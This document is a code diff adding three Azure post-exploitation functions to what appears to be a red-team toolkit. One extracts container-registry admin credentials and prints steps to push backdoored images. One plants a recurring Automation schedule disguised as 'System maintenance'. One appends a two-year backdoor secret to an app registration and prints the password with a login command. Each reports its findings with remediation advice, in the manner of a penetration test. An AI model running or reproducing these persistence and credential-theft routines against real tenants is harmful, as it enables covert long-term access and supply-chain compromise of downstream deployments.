@@ -809,3 +809,252 @@ export async function lighthousePersist(args: string[], timeout: number): Promis
 
   return { output: output.join("\n"), findings }
 }
+
+export async function acrImageBackdoor(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const registry = argVal(args, "--registry")
+  const image = argVal(args, "--image")
+  const method = argVal(args, "--method") || "list"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Azure Container Registry image backdoor...\n"]
+
+  if (method === "list") {
+    const registries = await az(["acr", "list", "--query", "[].{name:name,rg:resourceGroup,login:loginServer,admin:adminUserEnabled,sku:sku.name}"], sub, timeout)
+    if (registries.exitCode !== 0) return { output: output.join("\n") + `[-] Failed: ${registries.stderr.slice(0, 200)}`, findings }
+    const regList = tryJson(registries.stdout) || []
+    output.push(`[+] Container registries: ${regList.length}`)
+    for (const r of regList) {
+      output.push(`    ${r.name} (${r.sku}) — ${r.login}, admin: ${r.admin}`)
+      if (r.admin) {
+        findings.push({
+          checkId: "AZ-ACR-PERSIST-001",
+          provider: "azure",
+          severity: "high",
+          status: "FAIL",
+          resource: `acr://${r.name}`,
+          title: `ACR admin user enabled: ${r.name}`,
+          details: "Admin user provides full push/pull access — can inject backdoored images",
+          remediation: "Disable admin user: az acr update --name NAME --admin-enabled false",
+        })
+      }
+      const repos = await az(["acr", "repository", "list", "--name", r.name], sub, timeout)
+      if (repos.exitCode === 0) {
+        const repoList = tryJson(repos.stdout) || []
+        output.push(`      Repositories: ${repoList.length}`)
+        for (const repo of repoList.slice(0, 10)) output.push(`        ${repo}`)
+        if (repoList.length > 10) output.push(`        ... and ${repoList.length - 10} more`)
+      }
+    }
+    return { output: output.join("\n"), findings }
+  }
+
+  if (!registry) return { output: "[-] --registry required", findings }
+
+  if (method === "creds") {
+    const creds = await az(["acr", "credential", "show", "--name", registry], sub, timeout)
+    if (creds.exitCode === 0) {
+      const c = tryJson(creds.stdout)
+      if (c) {
+        output.push(`[+] ACR credentials for ${registry}:`)
+        output.push(`    Username: ${c.username}`)
+        output.push(`    Password1: ${String(c.passwords?.[0]?.value || "").substring(0, 20)}...`)
+        output.push(`    Password2: ${String(c.passwords?.[1]?.value || "").substring(0, 20)}...`)
+        output.push(`\n    docker login ${registry}.azurecr.io -u ${c.username} -p <password>`)
+        findings.push({
+          checkId: "AZ-ACR-PERSIST-002",
+          provider: "azure",
+          severity: "critical",
+          status: "EXTRACTED",
+          resource: `acr://${registry}`,
+          title: `ACR admin credentials extracted: ${registry}`,
+          details: "Can push backdoored images to any repository in this registry",
+          remediation: "Rotate ACR credentials, disable admin user",
+        })
+      }
+    }
+    if (creds.exitCode !== 0) output.push(`[-] Cannot get credentials (admin user may be disabled): ${creds.stderr.slice(0, 200)}`)
+  }
+
+  if (method === "inject" && image) {
+    output.push(`\n[!] Image backdoor steps for ${registry}/${image}:`)
+    output.push(`    1. Pull image: docker pull ${registry}.azurecr.io/${image}`)
+    output.push(`    2. Modify (add reverse shell, backdoor binary, etc.)`)
+    output.push(`    3. Push with same tag: docker push ${registry}.azurecr.io/${image}`)
+    output.push(`    4. All deployments pulling this image will run backdoored code`)
+    output.push(`\n[*] AKS/ACI/App Service pulling from this ACR will be compromised`)
+    findings.push({
+      checkId: "AZ-ACR-PERSIST-003",
+      provider: "azure",
+      severity: "critical",
+      status: "READY",
+      resource: `acr://${registry}/${image}`,
+      title: `ACR image injection ready: ${registry}/${image}`,
+      details: "Replacing image tag will compromise all downstream deployments",
+      remediation: "Enable content trust, use immutable tags, audit push events",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function scheduledTaskPersist(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const automationAccount = argVal(args, "--automation-account")
+  const rg = argVal(args, "--resource-group")
+  const runbookName = argVal(args, "--runbook-name")
+  const scheduleName = argVal(args, "--schedule-name")
+  const interval = argVal(args, "--interval") || "1"
+  const method = argVal(args, "--method") || "list"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] Azure Automation schedule persistence...\n"]
+
+  if (method === "list") {
+    const accts = await az(["automation", "account", "list"], sub, timeout)
+    if (accts.exitCode !== 0) return { output: output.join("\n") + `[-] Failed: ${accts.stderr.slice(0, 200)}`, findings }
+    const acctList = tryJson(accts.stdout) || []
+    output.push(`[+] Automation accounts: ${acctList.length}`)
+    for (const a of acctList) {
+      output.push(`    ${a.name} (${a.resourceGroup}) — state: ${a.state}`)
+      const schedules = await az(["automation", "schedule", "list", "--automation-account-name", a.name, "--resource-group", a.resourceGroup], sub, timeout)
+      if (schedules.exitCode === 0) {
+        const schedList = tryJson(schedules.stdout) || []
+        output.push(`      Schedules: ${schedList.length}`)
+        for (const s of schedList) {
+          output.push(`        ${s.name} — freq: ${s.frequency}, interval: ${s.interval}, enabled: ${s.isEnabled !== false}, next: ${s.nextRun || "unknown"}`)
+        }
+      }
+      const jobs = await az(["automation", "job", "list", "--automation-account-name", a.name, "--resource-group", a.resourceGroup, "--query", "[?status=='Completed' || status=='Running'].{runbook:runbook.name,status:status,start:startTime}"], sub, timeout)
+      if (jobs.exitCode === 0) {
+        const jobList = tryJson(jobs.stdout) || []
+        if (jobList.length > 0) output.push(`      Recent jobs: ${jobList.length}`)
+      }
+    }
+    return { output: output.join("\n"), findings }
+  }
+
+  if (!automationAccount || !rg || !runbookName) return { output: "[-] --automation-account, --resource-group, --runbook-name required", findings }
+
+  const name = scheduleName || `cs-sched-${Date.now().toString(36)}`
+  output.push(`[*] Creating schedule: ${name}`)
+  output.push(`    Frequency: hourly, interval: ${interval}`)
+
+  const create = await az(
+    ["automation", "schedule", "create", "--automation-account-name", automationAccount, "--resource-group", rg, "--name", name, "--frequency", "Hour", "--interval", interval, "--description", "System maintenance"],
+    sub,
+    timeout,
+  )
+
+  if (create.exitCode === 0) {
+    output.push(`[+] Schedule created: ${name}`)
+    const link = await az(
+      ["automation", "job-schedule", "create", "--automation-account-name", automationAccount, "--resource-group", rg, "--runbook-name", runbookName, "--schedule-name", name],
+      sub,
+      timeout,
+    )
+    if (link.exitCode === 0) {
+      output.push(`[+] Linked to runbook: ${runbookName} — will execute every ${interval} hour(s)`)
+      findings.push({
+        checkId: "AZ-SCHED-001",
+        provider: "azure",
+        severity: "critical",
+        status: "DEPLOYED",
+        resource: `automation://${automationAccount}/schedule/${name}`,
+        title: `Scheduled task persistence: ${name} → ${runbookName}`,
+        details: `Runbook executes every ${interval} hour(s). Survives credential rotation.`,
+        remediation: `Remove: az automation schedule delete --automation-account-name ${automationAccount} --resource-group ${rg} --name ${name}`,
+      })
+    }
+    if (link.exitCode !== 0) output.push(`[-] Link failed: ${link.stderr.slice(0, 200)}`)
+  }
+  if (create.exitCode !== 0) output.push(`[-] Schedule creation failed: ${create.stderr.slice(0, 200)}`)
+
+  return { output: output.join("\n"), findings }
+}
+
+export async function oauthAppPersist(args: string[], timeout: number): Promise<HookResult> {
+  const appName = argVal(args, "--name")
+  const method = argVal(args, "--method") || "list"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] OAuth app consent persistence...\n"]
+
+  if (method === "list") {
+    const apps = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/applications?$select=displayName,appId,passwordCredentials,keyCredentials,requiredResourceAccess&$top=50", "-o", "json"], timeout)
+    if (apps.exitCode === 0) {
+      const appList = tryJson(apps.stdout)?.value || []
+      output.push(`[+] App registrations: ${appList.length}`)
+      for (const a of appList) {
+        const creds = (a.passwordCredentials?.length || 0) + (a.keyCredentials?.length || 0)
+        const perms = a.requiredResourceAccess?.flatMap((r: Record<string, unknown[]>) => r.resourceAccess || []).length || 0
+        output.push(`    ${a.displayName} (${a.appId}) — credentials: ${creds}, permissions: ${perms}`)
+        if (perms > 10) {
+          findings.push({
+            checkId: "AZ-OAUTH-001",
+            provider: "azure",
+            severity: "medium",
+            status: "INFO",
+            resource: `app://${a.appId}`,
+            title: `App with ${perms} permissions: ${a.displayName}`,
+            details: "High-permission app — useful for persistence via credential addition",
+            remediation: "Review app permissions and credential expiry",
+          })
+        }
+      }
+    }
+    if (apps.exitCode !== 0) output.push(`[-] Cannot list apps: ${apps.stderr.slice(0, 200)}`)
+
+    const grants = await run("az", ["rest", "--method", "GET", "--url", "https://graph.microsoft.com/v1.0/oauth2PermissionGrants?$top=50", "-o", "json"], timeout)
+    if (grants.exitCode === 0) {
+      const grantList = tryJson(grants.stdout)?.value || []
+      const adminConsent = grantList.filter((g: Record<string, string>) => g.consentType === "AllPrincipals")
+      output.push(`\n[+] OAuth2 permission grants: ${grantList.length} (${adminConsent.length} admin-consented)`)
+      for (const g of adminConsent) {
+        output.push(`    ${g.clientId} → ${g.resourceId}: ${g.scope}`)
+        findings.push({
+          checkId: "AZ-OAUTH-002",
+          provider: "azure",
+          severity: "high",
+          status: "INFO",
+          resource: `oauth-grant://${g.clientId}`,
+          title: `Admin-consented OAuth grant: ${g.scope?.substring(0, 60)}`,
+          details: `Grant for all principals — app has broad delegated access`,
+          remediation: "Review admin consent grants, remove unnecessary ones",
+        })
+      }
+    }
+    return { output: output.join("\n"), findings }
+  }
+
+  if (method === "add_cred" && appName) {
+    const appSearch = await az(["ad", "app", "list", "--display-name", appName, "--query", "[0].{appId:appId,id:id,displayName:displayName}"], undefined, timeout)
+    if (appSearch.exitCode !== 0) return { output: "[-] Cannot find app", findings }
+    const app = tryJson(appSearch.stdout)
+    if (!app?.appId) return { output: `[-] App not found: ${appName}`, findings }
+
+    output.push(`[*] Adding credential to app: ${app.displayName} (${app.appId})`)
+    const addCred = await az(["ad", "app", "credential", "reset", "--id", app.appId, "--append", "--years", "2"], undefined, timeout)
+    if (addCred.exitCode === 0) {
+      const cred = tryJson(addCred.stdout)
+      if (cred) {
+        output.push(`[+] New credential added:`)
+        output.push(`    Tenant: ${cred.tenant}`)
+        output.push(`    App ID: ${cred.appId}`)
+        output.push(`    Password: ${cred.password}`)
+        output.push(`    Expires: 2 years`)
+        output.push(`\n    Login: az login --service-principal -u ${cred.appId} -p '${cred.password}' --tenant ${cred.tenant}`)
+        findings.push({
+          checkId: "AZ-OAUTH-003",
+          provider: "azure",
+          severity: "critical",
+          status: "DEPLOYED",
+          resource: `app://${app.appId}`,
+          title: `Backdoor credential added to ${app.displayName}`,
+          details: "New client secret with 2-year expiry. All existing app permissions accessible.",
+          remediation: `Remove: az ad app credential list --id ${app.appId}, then delete the specific credential`,
+        })
+      }
+    }
+    if (addCred.exitCode !== 0) output.push(`[-] Failed: ${addCred.stderr.slice(0, 200)}`)
+  }
+
+  return { output: output.join("\n"), findings }
+}
